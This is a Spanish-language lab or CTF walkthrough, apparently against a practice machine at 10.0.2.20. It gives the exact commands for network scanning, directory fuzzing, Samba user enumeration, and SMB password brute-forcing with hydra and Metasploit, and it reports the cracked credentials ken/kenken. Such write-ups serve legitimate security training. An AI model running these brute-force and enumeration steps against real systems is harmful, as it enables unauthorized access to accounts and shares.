
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.20 -oN escaneo
gobuster dir -u http://10.0.2.20/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 
gobuster dir -u http://10.0.2.20:81/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 
rpcclient -U "" -N 10.0.2.20
hydra -l ken -P /usr/share/wordlists/rockyou.txt smb://10.0.2.20
msfdb init && msfconsole
smbmap -H 10.0.2.20 -u 'ken' -p 'kenken'

```
Primero de todo realizamos un arp-scan para encontrar la IP y una vez tengamos su IP realizamos un nmap y encontramos los puertos 22, 80, 81, 139, 445 abiertos
![[Pasted image 20240307212619.png]]Miramos primero la pagina web alojada en el puerto 80 y encontramos un texto y tampoco nada destacable en su código fuente si miramos la web alojada en el puerto 81 también encontramos la misma pestaña así que procedemos a hacer fuzzing con gobusters 
![[Pasted image 20240307213007.png]]
![[Pasted image 20240307213136.png]]
Debido a que no encontramos nada del fuzzing intentamos atacar ahora al puerto 445 que corre un Samba primero intentamos enumerar usuarios usando el rpcclient.
```rpcclient
srvinfo
querydispinfo
enumdomusers
```
![[Pasted image 20240307213450.png]]
Ahora que tenemos usuarios validos usaremos hydra para hacer un ataque de fuerza bruta contra el usuario ken![[Pasted image 20240307214523.png]]
Como no funcion hydra usaremos metasploit
```Metasploit
use auxiliary/scanner/smb/smb_login
show options
set RHOSTS 10.0.2.20
set SMBUser ken
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
run
set SMBUser takeshi
run
```
![[Pasted image 20240307214713.png]]
Encuentra un usuario y contraseña ken kenken![[Pasted image 20240307215306.png]]
Ahora buscamos el otro pero no encontramos la contraseña así que ejecutamos smbmap para enumerar todos los recursos compartidos de la máquina![[Pasted image 20240307221048.png]]